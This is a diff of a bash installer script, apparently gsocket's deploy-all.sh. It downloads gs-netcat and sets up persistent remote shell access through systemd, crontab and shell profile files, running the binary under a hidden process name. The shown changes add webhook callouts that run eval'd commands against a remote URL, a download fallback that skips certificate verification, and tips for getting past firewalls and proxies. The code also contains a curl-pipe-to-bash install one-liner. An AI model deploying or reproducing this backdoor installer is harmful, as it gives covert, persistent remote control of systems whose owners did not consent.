-	echo -en 2>&1 "Installing systemwide remote access permanentally....................."
+	echo -en "Installing systemwide remote access permanentally....................."
 
 	# Try systemd first
 	install_system_systemd
@@ -1031,7 +1220,7 @@ install_system()
 install_user_crontab()
 {
 	command -v crontab >/dev/null || return # no crontab
-	echo -en 2>&1 "Installing access via crontab........................................."
+	echo -en "Installing access via crontab........................................."
 	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
@@ -1066,7 +1255,7 @@ install_user_profile()
 	rc_filename_status="${rc_filename}................................"
 	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"
 
-	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
+	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
 	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
@@ -1098,19 +1287,19 @@ install_user()
 ask_nocertcheck()
 {
 	WARN "Can not verify host. CA Bundle is not installed."
-	echo "--> Attempting without certificate verification."
-	echo "--> Press any key to continue or CTRL-C to abort..."
-	echo -en 1>&2 -en "--> Continuing in "
+	echo >&2 "--> Attempting without certificate verification."
+	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
+	echo -en >&2 "--> Continuing in "
 	local n
 
 	n=10
 	while :; do
-		echo -en 1>&2 "${n}.."
+		echo -en >&2 "${n}.."
 		n=$((n-1))
 		[[ $n -eq 0 ]] && break 
 		read -r -t1 -n1 && break
 	done
-	[[ $n -gt 0 ]] || echo 1>&2 "0"
+	[[ $n -gt 0 ]] || echo >&2 "0"
 
 	GS_NOCERTCHECK=1
 }
@@ -1119,40 +1308,28 @@ ask_nocertcheck()
 # <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
 dl_ssl()
 {
+	local cmd sslerr arg_nossl
+	cmd="$3"
+	sslerr="$2"
+	arg_nossl="$1"
+
+	shift 3
 	if [[ -z $GS_NOCERTCHECK ]]; then
-		DL_LOG=$("$3" "$4" "$5" "$6" "$7" 2>&1)
-		[[ "${DL_LOG}" != *"$2"* ]] && return
+		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
+		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
 	fi
 
-	if [[ -z $GS_NOCERTCHECK ]]; then
-		SKIP_OUT
-		ask_nocertcheck
-	fi
+	FAIL_OUT "Certificate Error."
+	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
 	[[ -z $GS_NOCERTCHECK ]] && return
 
-	echo -en 2>&1 "Downloading binaries without certificate verification................."
-	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
+	echo -en "--> Downloading binaries without certificate verification............."
+	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
 }
 
 # Download $1 and save it to $2
 dl()
 {
-	[[ -s "$2" ]] && return
-
-	# Need to set DL_CMD before GS_DEBUG check for proper error output
-	# DL_CMD is used for help output of how to uninstall
-	if [[ -n "$GS_USELOCAL" ]]; then
-		DL_CMD="./deploy-all.sh"
-	elif command -v curl >/dev/null; then
-		DL_CMD="$DL_CRL"
-	elif command -v wget >/dev/null; then
-		DL_CMD="$DL_WGT"
-	else
-		# errexit "Need curl or wget."
-		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
-		errexit
-	fi
-
 	# Debugging / testing. Use local package if available
 	if [[ -n "$GS_USELOCAL" ]]; then
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
@@ -1161,13 +1338,14 @@ dl()
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
 	fi
-	[[ -n "$GS_USELOCAL" ]] && return # NOT REACHED
 
-	# HERE: It's either wget or curl (but not GS_USELOCAL)
-	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
-		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
-	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
+	# Delete. Maybe previous download failed.
+	[[ -s "$2" ]] && rm -f "${2:?}"
+
+	if [[ -n $IS_USE_CURL ]]; then
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
+	elif [[ -n $IS_USE_WGET ]]; then
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -1175,13 +1353,13 @@ dl()
 	fi
 
 	# Download failed:
-	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
 }
 
 # S= was set. Do not install but execute in place.
 gs_access()
 {
-	echo -e 2>&1 "Connecting..."
+	echo -e "Connecting..."
 	local ret
 	GS_SECRET="${S}"
 
@@ -1198,49 +1376,27 @@ gs_access()
 	exit_code "$ret"
 }
 
-# gs_update()
-# {
-# 	echo -en 2>&1 "Checking existing binaries............................................"
-
-# 	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
-# 	OK_OUT
-
-# 	local gsnc_bin
-# 	gsnc_bin="$(command -v gs-netcat)"
-
-# 	echo -en 2>&1 "Backup old binaries..................................................."
-# 	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
-# 	OK_OUT
-
-# 	echo -en 2>&1 "Updating binaries....................................................."
-
-# 	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
-# 	OK_OUT
-
-# 	echo -en 2>&1 "Testing updated binaries.............................................."
-# 	ver_new="$(gs-netcat -h 2>&1 | grep ^Version | sed -E 's/Version (.*),.*/\1/g')"
-# 	[[ "$ver_new" =~ $GS_VERSION ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }
-
-# 	OK_OUT "Updated to $ver_new"
-# 	exit 0
-# }
-
 # Binary is in an executeable directory (no noexec-flag)
 # set IS_TESTBIN_OK if binary worked.
 # test_bin <binary>
 test_bin()
 {
 	local bin
-	local err_log
 	unset IS_TESTBIN_OK
 
 	bin="$1"
 
 	# Try to execute the binary
-	GS_OUT=$("$bin" -g 2>/dev/null)
+	unset ERR_LOG
+	GS_OUT=$("$bin" -g 2>&1)
 	ret=$?
-	# 126 - Exec format error
-	[[ -z "$GS_OUT" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$ret" "wrong binary"; return; }
+	[[ $ret -ne 0 ]] && {
+		# 126 - Exec format error
+		FAIL_OUT
+		ERR_LOG="$GS_OUT"
+		WARN_EXECFAIL_SET "$ret" "wrong binary"
+		return
+	}
 
 	# Use randomly generated secret unless it's set already (X=)
 	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
@@ -1250,6 +1406,7 @@ test_bin()
 
 test_network()
 {
+	local ret
 	unset IS_TESTNETWORK_OK
 
 	# There should be no GS-NETCAT listening.
@@ -1260,7 +1417,7 @@ test_network()
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
 	# Do not need GS_ENV[*] here because all env variables are exported
 	# when exec is used.
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -1276,7 +1433,16 @@ test_network()
 		FAIL_OUT
 		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 		# EXIT if we can not check if SECRET has already been used.
-		errexit "Cannot connect to GSRN. Firewalled?"
+		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
+	}
+
+	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
+	# >1.4.40 return 203 (NETERROR)
+	[[ $ret -eq 255 ]] && {
+		# Connect reset by peer
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
 	}
 
 	[[ $ret -eq 0 ]] && {
@@ -1299,51 +1465,95 @@ test_network()
 	WARN_EXECFAIL_SET "$ret" "default pkg failed"
 }
 
+do_webhook()
+{
+	local arr
+	local IFS
+	local str
+
+	IFS=""
+	# Expand any $SECRET variable, etc.
+	while [[ $# -gt 0 ]]; do
+		# We need to escape all " to "'"'" to pass 'eval' correctly.
+		# (Note: This _WILL_ expand $-style variables - what we want)
+		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
+		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+		str="${1//\"/\"'\"'\"}"
+        eval str=\""$str"\"
+		arr+=("$str")
+		shift 1
+	done
+
+	# echo "arr=${#arr[@]}: ${arr[@]}"
+	"${arr[@]}"
+}
+
+webhooks()
+{
+	local arr
+	local ok
+	local err
+
+	echo -en "Executing webhooks...................................................."
+	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
+
+	if [[ -n $IS_USE_CURL ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
+	elif [[ -n $IS_USE_WGET ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
+	fi
+	[[ -n $ok ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+}
+
 try_network()
 {
-	DEBUGF "GS_SECRET2=${GS_SECRET}"
-	echo -en 2>&1 "Testing Global Socket Relay Network..................................."
+	echo -en "Testing Global Socket Relay Network..................................."
 	test_network
-	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
-		OK_OUT
-		return
-	fi
+	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }
 
 	FAIL_OUT
 	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 	WARN_EXECFAIL
 }
 
-# try <osarch>
+# try <osarch> <srcpackage>
 try()
 {
-	local osarch
-	local src_pkg
-	osarch="$1"
+	local osarch="$1"
+	local src_pkg="$2"
 
-	src_pkg="gs-netcat_${osarch}.tar.gz"
-	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
+	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
+	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
-	echo -en 2>&1 "Downloading binaries.................................................."
-	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
+	echo -en "Downloading binaries.................................................."
+	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
 	OK_OUT
 
-	echo -en 2>&1 "Unpacking binaries...................................................."
-	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
-	[[ -n $GS_USELOCAL_GSNC ]] && {
-		[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-		xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
-	}
+	echo -en "Unpacking binaries...................................................."
+	if [[ "${src_pkg}" == *.tar.gz ]]; then
+		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
+		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		[[ -n $GS_USELOCAL_GSNC ]] && {
+			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
+			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+		}
+	else
+		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
+	fi
 	OK_OUT
 
-	echo -en 2>&1 "Copying binaries......................................................"
+	echo -en "Copying binaries......................................................"
 	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
-	echo -en 2>&1 "Testing binaries......................................................"
+	echo -en "Testing binaries......................................................"
 	test_bin "${DSTBIN}"
 	if [[ -n "$IS_TESTBIN_OK" ]]; then
 		OK_OUT
@@ -1351,25 +1561,6 @@ try()
 	fi
 
 	rm -f "${TMPDIR}/${src_pkg:?}"
-}
-
-# Download the gs-netcat_any-any.tar.gz and try all of the containing
-# binaries and fail hard if none could be found.
-try_any()
-{
-	targets="x86_64-alpine i386-alpine aarch64-linux arm-linux x86_64-osx x86_64-cygwin i686-cygwin mips32-alpine mipsel32-alpine x86_64-freebsd"
-	for osarch in $targets; do
-		[[ "$osarch" = "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
-		try "$osarch"
-		[[ -n "$IS_TESTBIN_OK" ]] && break
-	done
-
-
-	if [[ -n "$IS_TESTBIN_OK" ]]; then
-		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
-	else
-		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
-	fi
 }
 
 gs_start_systemd()
@@ -1396,9 +1587,7 @@ gs_start_systemd()
 gs_start()
 {
 	# If installed as systemd then try to start it
-	if [[ -n "$IS_SYSTEMD" ]]; then
-		gs_start_systemd
-	fi
+	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
 	[[ -n "$IS_GS_RUNNING" ]] && return
 
 	# Scenario to consider:
@@ -1425,8 +1614,8 @@ gs_start()
 			# HERE: sec.dat has been updated
 			OK_OUT
 			WARN "More than one ${PROC_HIDDEN_NAME} is running."
-			echo -e 1>&2 "--> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
-			[[ -n $OLD_PIDS ]] && echo -e 1>&2 "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
+			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
+			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
 	else
 		OK_OUT ""
@@ -1450,11 +1639,11 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
-
 if [[ -z $S ]]; then
+	# HERE: S= is NOT set
 	if [[ $UID -eq 0 ]]; then
 		gs_secret_reload "$SYSTEMD_SEC_FILE" 
 		gs_secret_reload "$RCLOCAL_SEC_FILE" 
@@ -1467,14 +1656,15 @@ if [[ -z $S ]]; then
 		GS_SECRET="${GS_SECRET_X}"
 	fi
 
-	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, G=${GS_SECRET_X})"
+	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
 else
 	GS_SECRET="$S"
+	URL_BIN="$URL_BIN_FULL"
 fi
 
-try "$OSARCH"
+try "$OSARCH" "$SRC_PKG"
 
-[[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
+# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 
@@ -1487,7 +1677,7 @@ WARN_EXECFAIL
 # -----BEGIN Install permanentally-----
 if [[ -z $GS_NOINST ]]; then
 	if [[ -n $IS_DSTBIN_TMP ]]; then
-		echo -en 2>&1 "Installing remote access.............................................."
+		echo -en "Installing remote access.............................................."
 		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
 	else
 		# Try to install system wide. This may also start the service.
@@ -1497,25 +1687,27 @@ if [[ -z $GS_NOINST ]]; then
 		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
 	fi
 else
-	echo -e 2>&1 "GS_NOINST is set. Skipping installation."
+	echo -e "GS_NOINST is set. Skipping installation."
 fi
 # -----END Install permanentally-----
 
-if [[ -z "$IS_INSTALLED" || -n $IS_DSTBIN_TMP ]]; then
-	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
+if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
+	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 	
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
+webhooks
+
 HOWTO_CONNECT_OUT
 
-printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
+printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$GS_NOSTART" ]]; then
 	SKIP_OUT "GS_NOSTART=1 is set."
 else
 	gs_start
 fi
 
-echo -e 2>&2 "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
 
 exit_code 0
